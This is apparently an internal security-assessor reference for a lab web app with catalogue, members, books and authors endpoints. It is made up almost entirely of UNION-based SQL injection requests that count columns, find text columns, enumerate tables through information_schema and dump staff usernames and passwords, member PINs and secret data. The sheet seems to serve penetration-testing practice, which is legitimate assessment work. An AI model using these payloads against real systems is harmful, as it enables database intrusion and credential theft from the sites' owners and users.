Security assessor reference. Internal use only.

UNION VULN-5 · List DB Contents (non-Oracle / PostgreSQL)

Endpoint: GET /catalog?genre=X — 3-column query (title, author, genre)

GET /catalog?genre='+UNION+SELECT+table_name,table_schema,'t'+FROM+information_schema.tables-- GET /catalog?genre='+UNION+SELECT+column_name,data_type,'c'+FROM+information_schema.columns+WHERE+table_name='staff'-- GET /catalog?genre='+UNION+SELECT+username,password,'u'+FROM+staff-- GET /catalog?genre='+UNION+SELECT+label,value,'s'+FROM+secret_data--

UNION VULN-6 · List DB Contents (Oracle sim)

Endpoint: GET /members?id=X — numeric param, 3 cols (name, email, membership)
Oracle: SELECT table_name FROM all_tables → PG: information_schema.tables

GET /members?id=1+UNION+SELECT+table_name,table_schema,NULL+FROM+information_schema.tables-- GET /members?id=1+UNION+SELECT+username,password,role+FROM+staff-- GET /members?id=0+UNION+SELECT+name,pin,membership+FROM+members-- # Oracle equivalent: 1 UNION SELECT table_name,NULL,NULL FROM all_tables--

UNION VULN-7 · Determine Number of Columns

Endpoint: GET /books?title=X — probe column count with ORDER BY then NULL

GET /books?title='+ORDER+BY+1-- ← no error GET /books?title='+ORDER+BY+2-- ← no error GET /books?title='+ORDER+BY+3-- ← no error GET /books?title='+ORDER+BY+4-- ← ERROR → 3 columns confirmed GET /books?title='+UNION+SELECT+NULL,NULL,NULL-- ← success GET /books?title='+UNION+SELECT+version(),NULL,NULL--

UNION VULN-8 · Find Column Containing Text

Endpoint: GET /authors?name=X — cols: id(int), name(text), membership(text)

GET /authors?name='+UNION+SELECT+'a',NULL,NULL-- ← ERROR (col 1 is int) GET /authors?name='+UNION+SELECT+NULL,'a',NULL-- ← SUCCESS (col 2 is text) GET /authors?name='+UNION+SELECT+NULL,'SQLI_TEST',NULL-- GET /authors?name='+UNION+SELECT+NULL,username||':'||password,role+FROM+staff--
